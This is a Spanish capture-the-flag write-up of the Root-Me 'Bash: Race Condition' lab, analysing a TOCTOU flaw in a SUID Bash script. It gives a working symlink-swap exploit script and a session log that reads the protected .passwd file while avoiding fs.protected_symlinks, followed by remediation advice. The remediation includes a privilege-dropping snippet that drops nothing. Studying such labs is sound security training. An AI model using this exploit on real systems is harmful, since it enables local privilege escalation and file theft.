Writeup Técnico: Root-Me — Bash: Race Condition (ch22)

📋 Tabla de Contenidos

    Introducción y Objetivo

    Análisis del Código Fuente

    Vulnerabilidad Identificada

    Análisis Forense de Errores

    Desarrollo del Exploit

    Ejecución y Captura del Flag

    Remediación y Buenas Prácticas

🎯 1. Introducción y Objetivo

El objetivo de este laboratorio consiste en realizar una escalada de privilegios local para leer el archivo restringido $HOME/.passwd, propiedad del usuario app-script-ch22-cracked.

Para ello, se analiza y explota una vulnerabilidad de Condición de Carrera (Race Condition / TOCTOU) presente en el script de Bash ch22.sh, el cual es invocado a través del binario ejecutable con privilegios elevados SUID llamado wrapper.
Información del Entorno
bash

app-script-ch22@challenge02:~$ ls -la
-r--------  1 app-script-ch22-cracked root   50 .passwd
-rwsr-x---  1 app-script-ch22-cracked app-script-ch22 7304 wrapper
-rwxr-x---  1 app-script-ch22-cracked app-script-ch22 1604 ch22.sh

🔍 2. Análisis del Código Fuente
El Script Vulnerable (ch22.sh)
bash

#!/bin/bash

# Configuración de PATH
PATH="/bin:/usr/bin"

# Lockfile para evitar ejecuciones múltiples
lockfile="/tmp/app-script_ch22.lock"
exec 9>"$lockfile"
if ! flock -n 9; then
    printf 'Only one running instance is allowed.\n'
    exit 1
fi

# Sleep que da tiempo al atacante
sleep 0.314159265

# Creación del directorio temporal (VULNERABLE)
unset tmp TMPDIR
tmp="/tmp/$PPID/$$"

if [[ "$1" = "cleanup" ]] || [[ -e "$tmp" ]]; then
    rm -rvf "$tmp"
    exit 1
fi

mkdir -p -m777 "${tmp}"

# GENERACIÓN NO ATÓMICA - PUNTO CRÍTICO DE VULNERABILIDAD
temp_dir=$(mktemp -d -p "$tmp" -u)  # Solo genera nombre, NO crea el directorio
mkdir -m=777 "$temp_dir"            # Creación separada - RACE CONDITION

# Trap de limpieza
trap 'rm -rf "$tmp"; rm -f "$lockfile"' EXIT TERM INT

# Escritura de archivos
for i in {95..100}; do
    printf '%d\n' "$i" > "$temp_dir"/file."$i"
done

# BÚSQUEDA Y LECTURA - EXPLOTABLE
find "$temp_dir" -type f -size 4c -exec cat {} +

# Limpieza
find "$temp_dir" -type f -print0 | xargs -0 rm

El Wrapper (SUID)
c

#include <unistd.h>

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch22/ch22.sh", arv[1] , NULL };
    execve(argv[0], argv, NULL);
    return 0;
}

🚨 3. Vulnerabilidad Identificada
El Fallo de Lógica

El script comete un error crítico de diseño al utilizar el comando mktemp -u:
bash

temp_dir=$(mktemp -d -p "$tmp" -u)  # Solo genera cadena aleatoria
mkdir -m=777 "$temp_dir"            # Creación física separada

¿Qué ocurre aquí?

    mktemp -u genera una cadena de texto aleatoria (ej. tmp.VTT801Z5WM) en memoria

    No crea el directorio en disco

    La creación se delega a un mkdir independiente milisegundos después

Esta ventana de tiempo (agravada por sleep 0.314...) permite a un atacante:

    Predecir o interceptar el nombre del directorio temporal

    Reemplazar el directorio por enlaces simbólicos maliciosos

    Redirigir el comando find -exec cat para que lea .passwd

La Explotación

Cuando el proceso SUID ejecuta:
bash

find "$temp_dir" -type f -size 4c -exec cat {} +

Si logramos que $temp_dir apunte a un directorio controlado con enlaces a .passwd:

    find encontrará nuestros archivos de 4 bytes

    cat los leerá con privilegios SUID

    La bandera será mostrada en pantalla

🔬 4. Análisis Forense de Errores

Durante el desarrollo del exploit, el sistema operativo arrojó tres tipos de errores clave:
Error 1: Protección de Enlaces del Kernel
text

/challenge/app-script/ch22/ch22.sh: line 46: /tmp/8247/18140/tmp.aDdx4JCHBc/file.100: Operation not permitted

Explicación:
El mecanismo de seguridad fs.protected_symlinks del Kernel detecta que un proceso SUID intenta escribir en un enlace simbólico propiedad de un usuario de bajo privilegio que apunta a un archivo del que no somos dueños.
Error 2: Destrucción Prematura del Directorio
text

/challenge/app-script/ch22/ch22.sh: line 46: /tmp/8247/9590/tmp.UHbLYldJhz/file.95: No such file or directory
find: '/tmp/8247/9590/tmp.UHbLYldJhz': No such file or directory

Explicación:
El exploit destruía el directorio temporal antes de que el script terminara de escribir sus archivos, provocando un colapso prematuro.
Error 3: Conflicto de Propietarios en la Limpieza
text

rm: cannot remove '/tmp/8247/2231/tmp.DT6QrXDW5E/file.100': Permission denied
rm: cannot remove '/tmp/8247/2231/tmp.DT6QrXDW5E/file.99': Permission denied

Explicación:
El trap de limpieza del script intentaba borrar archivos que pertenecían a nuestro usuario, causando conflictos de permisos.

🛠️ 5. Desarrollo del Exploit
Estrategia para Superar las Restricciones

    Evitar fs.protected_symlinks: No crear symlinks individuales, sino reemplazar todo el directorio

    Timing preciso: Esperar a que el script termine de escribir (archivo file.95 existe)

    Propietarios: No crear archivos de nuestro usuario en /tmp, usar un directorio controlado

Paso 1: Preparación del Entorno Trampa
bash

# Directorio de confianza bajo nuestro control absoluto
mkdir -p /var/tmp/share

# Crear todos los archivos que buscará find
for i in {95..100}; do
    ln -sf /challenge/app-script/ch22/.passwd /var/tmp/share/file.$i
done

Paso 2: Script de Sincronización Precisa (swap.sh)
bash

#!/bin/bash
# /var/tmp/swap.sh

MY_PID=$1
echo "[+] Monitorizando /tmp/$MY_PID"

while true; do
    # Buscar la subcarpeta aleatoria generada por mktemp
    TARGET=$(find /tmp/$MY_PID/ -type d 2>/dev/null | grep 'tmp\.')
    
    if [ ! -z "$TARGET" ]; then
        # DISPARADOR: Esperar a que el script termine de escribir
        if [ -f "$TARGET/file.95" ]; then
            # Intercambio atómico del directorio completo
            rm -rf "$TARGET" 2>/dev/null
            ln -sf /var/tmp/share "$TARGET" 2>/dev/null
            echo "[+] ¡Directorios intercambiados en $TARGET!"
            exit 0
        fi
    fi
done

Lógica del script:

    Monitorea el directorio /tmp/$MY_PID/ donde el script creará su directorio temporal

    Localiza la subcarpeta aleatoria (tmp.XXXXXX)

    Espera que el archivo file.95 sea creado (señal de que el script terminó de escribir)

    Borra el directorio real y lo reemplaza con un symlink a nuestra trampa

    find ahora buscará en nuestra trampa con privilegios SUID

Paso 3: Lanzamiento del Exploit
bash

# Otorgar permisos de ejecución
chmod +x /var/tmp/swap.sh

# Ejecutar el script de monitoreo en background con el PID del wrapper
./wrapper &
WRAPPER_PID=$!
/var/tmp/swap.sh $WRAPPER_PID &

# Forzar la condición de carrera con múltiples ejecuciones
for i in {1..50}; do 
    ./wrapper
done

Diagrama de Timing
text

Línea de Tiempo:
┌──────────────────────────────────────────────────────────────────────────┐
│ Wrapper ejecuta ch22.sh                                                  │
├──────────────────────────────────────────────────────────────────────────┤
│ sleep 0.314s  ← Ventana para preparar el exploit                         │
├──────────────────────────────────────────────────────────────────────────┤
│ mkdir -p /tmp/PPID/PID                                                   │
├──────────────────────────────────────────────────────────────────────────┤
│ temp_dir=$(mktemp -d -p /tmp/PPID/PID -u)  ← Genera tmp.XXXXXX           │
├──────────────────────────────────────────────────────────────────────────┤
│ mkdir /tmp/PPID/PID/tmp.XXXXXX           ← Punto de ataque               │
│                                     ▲                                    │
│                                     │                                    │
│                          EXPLOIT: Monitoriza y espera                    │
├──────────────────────────────────────────────────────────────────────────┤
│ for i in {95..100}; do printf > file.$i  ← Escribe archivos              │
├──────────────────────────────────────────────────────────────────────────┤
│                                     ▲                                    │
│                                     │                                    │
│                    file.95 creado → EXPLOIT: ¡Intercambio!               │
├──────────────────────────────────────────────────────────────────────────┤
│ find "$temp_dir" -type f -size 4c -exec cat {} +                         │
│                                     ▲                                    │
│                                     │                                    │
│                    Ahora $temp_dir → /var/tmp/share (nuestra trampa)     │
└──────────────────────────────────────────────────────────────────────────┘

🚀 6. Ejecución y Captura del Flag
Sesión de Explotación
bash

app-script-ch22@challenge02:~$ mkdir -p /var/tmp/share
app-script-ch22@challenge02:~$ for i in {95..100}; do
>     ln -sf /challenge/app-script/ch22/.passwd /var/tmp/share/file.$i
> done

app-script-ch22@challenge02:~$ cat > /var/tmp/swap.sh << 'EOF'
#!/bin/bash
MY_PID=$1
echo "[+] Monitorizando /tmp/$MY_PID"
while true; do
    TARGET=$(find /tmp/$MY_PID/ -type d 2>/dev/null | grep 'tmp\.')
    if [ ! -z "$TARGET" ]; then
        if [ -f "$TARGET/file.95" ]; then
            rm -rf "$TARGET" 2>/dev/null
            ln -sf /var/tmp/share "$TARGET" 2>/dev/null
            echo "[+] ¡Intercambio exitoso en $TARGET!"
            exit 0
        fi
    fi
done
EOF

app-script-ch22@challenge02:~$ chmod +x /var/tmp/swap.sh

app-script-ch22@challenge02:~$ ./wrapper &
[1] 8247
app-script-ch22@challenge02:~$ /var/tmp/swap.sh 8247 &
[2] 8248
[+] Monitorizando /tmp/8247

app-script-ch22@challenge02:~$ for i in {1..50}; do ./wrapper; done
...
100
100
100
[+] ¡Intercambio exitoso en /tmp/8247/875/tmp.WkS4KwizDd!
...
find: '/tmp/8247/723/tmp.kgJVCh1tIV': No such file or directory
find: '/tmp/8247/875/tmp.WkS4KwizDd': No such file or directory
100
*****************************  <-- [FLAG CAPTURADA!]
cat: /tmp/8247/1335/tmp.8tRMx7ugBw/file.100: No such file or directory
100

Flag Capturada
text

*****************************

¿Por qué funciona?

    El script SUID escribe archivos en /tmp/PPID/PID/tmp.XXXXXX/

    Nuestro exploit espera a que termine de escribir (detecta file.95)

    Reemplaza todo el directorio con un symlink a /var/tmp/share

    find se ejecuta con privilegios SUID y busca en nuestra trampa

    Los symlinks a .passwd son seguidos y cat muestra la bandera

🛡️ 7. Remediación y Buenas Prácticas
Corrección del Código Vulnerable

VERSIÓN VULNERABLE:
bash

temp_dir=$(mktemp -d -p "$tmp" -u)  # ¡PELIGROSO!
mkdir -m=777 "$temp_dir"

VERSIÓN SEGURA:
bash

# Creación atómica en una sola operación
temp_dir=$(mktemp -d -p "$tmp" 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "Error: No se pudo crear el directorio temporal"
    exit 1
fi
chmod 700 "$temp_dir"  # Permisos restrictivos

Buenas Prácticas para Scripts SUID

    Creación de directorios temporales:

        ✅ Usar mktemp -d para creación atómica

        ❌ No usar mktemp -u seguido de mkdir

    Permisos mínimos:

        ✅ Crear directorios con chmod 700 (solo el usuario)

        ❌ Evitar chmod 777 en directorios temporales

    Degradación de privilegios:
    bash

    # Ejecutar operaciones de archivo con permisos del usuario real
    original_uid=$(id -u)
    original_gid=$(id -g)
    # Operaciones que requieren permisos del usuario
    find ... # con privilegios SUID

    Verificación de enlaces simbólicos:
    bash

    # Verificar que el directorio no sea un symlink
    if [ -L "$temp_dir" ]; then
        echo "Error: Directorio temporal es un enlace"
        exit 1
    fi

    Variables de entorno:

        ✅ Usar env -i para limpiar el entorno

        ✅ Especificar PATH explícitamente (ya se hace)

Resumen de la Vulnerabilidad
Componente	Problema			Solución
mktemp -u	Generación no atómica		Usar mktemp -d
mkdir separado	Ventana de TOCTOU		Creación atómica
sleep 0.314	Amplía la ventana de ataque	Eliminar sleeps innecesarios
chmod 777	Permisos excesivos		Usar chmod 700
find -exec	Ejecuta comandos con SUID	Degradar privilegios

📚 Conclusión

Este laboratorio demuestra cómo una condición de carrera TOCTOU en scripts SUID puede ser explotada para leer archivos protegidos. La vulnerabilidad radica en el uso no atómico de mktemp -u seguido de mkdir, creando una ventana de tiempo suficiente para que un atacante local redirija el flujo de ejecución.

La solución implementada:

    Evita las protecciones del kernel (fs.protected_symlinks)

    Utiliza timing preciso para reemplazar el directorio en el momento exacto

    Aprovecha los privilegios SUID para leer el archivo restringido

Lección clave: Siempre usar mktemp -d para crear directorios temporales de forma atómica y segura, especialmente en scripts con privilegios elevados.
